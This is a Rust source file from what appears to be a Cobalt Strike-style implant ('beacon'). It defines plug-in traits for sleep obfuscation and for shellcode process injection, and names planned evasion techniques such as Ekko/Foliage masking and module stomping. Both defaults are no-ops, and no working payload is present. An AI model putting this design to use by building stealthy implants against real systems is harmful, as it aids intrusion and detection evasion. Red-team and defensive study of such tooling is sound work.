//! CS-style "kit" extension contracts — the plug-in points future P2 stealth
//! techniques implement, so they land as trait impls rather than beacon-loop
//! rewrites.
//!
//! Two kits today, both with behavior-preserving no-op defaults:
//! - [`SleepmaskKit`] / [`NoMask`] — sleep obfuscation (Ekko/Foliage is P2).
//! - [`ProcessInjectKit`] / [`NotImpl`] — spawn-to shellcode injection
//!   (module stomping is P2).
//!
//! ## Kit contract (what a third-party impl must satisfy)
//! Each kit is a Rust trait. A build selects an impl by changing the const
//! kit instance below (or a `Configured` alias). The beacon loop / postex
//! paths call through the trait, so swapping an impl changes only the kit
//! instance — never the call sites. A future CS-style `.o` kit bridge would
//! load a COFF object against one of these traits, mirroring `crates/coff` +
//! `bof.rs`.

#![cfg(target_os = "windows")]

// ---- Sleepmask kit -------------------------------------------------------

/// Sleep-obfuscation extension point. The default method is the current
/// behavior (plain indirect-syscall sleep, no masking); an encrypting kit
/// (Ekko/Foliage) overrides it.
pub trait SleepmaskKit {
    /// Mask the implant image + thread stacks, sleep ~`seconds`, then FULLY
    /// unmask before returning. Default: no masking — delegate to the
    /// indirect-syscall sleep (byte-identical to the pre-kit beacon loop).
    ///
    /// **Invariant a real impl MUST hold**: on return the implant image and
    /// every thread stack are byte-identical to entry. Returning with `.text`
    /// still encrypted (or a stack still XOR'd) crashes on the next instruction.
    fn sleep_masked(&self, seconds: u32) {
        crate::beacon::sleep_seconds(seconds);
    }
}

/// Default sleepmask kit: no masking. Behavior is identical to the pre-kit
/// loop (plain indirect `NtDelayExecution` via `beacon::sleep_seconds`).
pub struct NoMask;
impl SleepmaskKit for NoMask {}

/// The active sleepmask kit. Swap `NoMask` for an encrypting impl (Ekko/Foliage)
/// in P2; nothing else in the beacon loop changes.
const SLEEPMASK_KIT: NoMask = NoMask;

/// Beacon-facing sleep entry. Routes through the configured kit so a future
/// encrypting impl is a one-line kit swap, not a loop edit.
pub fn sleep(seconds: u32) {
    SLEEPMASK_KIT.sleep_masked(seconds);
}

// ---- Process-inject kit --------------------------------------------------

/// Raw Windows `HANDLE` to an injected thread/process. `0` on the not-impl
/// path; a real impl (module stomping, P2) returns the live handle.
#[allow(dead_code)]
pub struct InjectedHandle(pub usize);

/// Spawn-to-shellcode injection extension point (CS ProcessInject kit). The
/// default impl refuses — the production technique (module stomping) is a P2
/// stealth milestone.
pub trait ProcessInjectKit {
    /// Inject `shellcode` into a fresh `spawn_to` process; return a handle on
    /// success. Default: not implemented (returns `None`).
    fn inject(&self, spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
        let _ = (spawn_to, shellcode);
        None
    }
}

/// Default process-inject kit: no technique yet. Module stomping lands in P2.
pub struct NotImpl;
impl ProcessInjectKit for NotImpl {}

/// The active process-inject kit.
const PROCESS_INJECT_KIT: NotImpl = NotImpl;

/// Postex-facing injection entry. Returns `None` today (NotImpl); a real kit
/// makes spawn-to + execute-in-sacrificial-process available to postex without
/// a postex rewrite.
pub fn inject(spawn_to: &str, shellcode: &[u8]) -> Option<InjectedHandle> {
    PROCESS_INJECT_KIT.inject(spawn_to, shellcode)
}
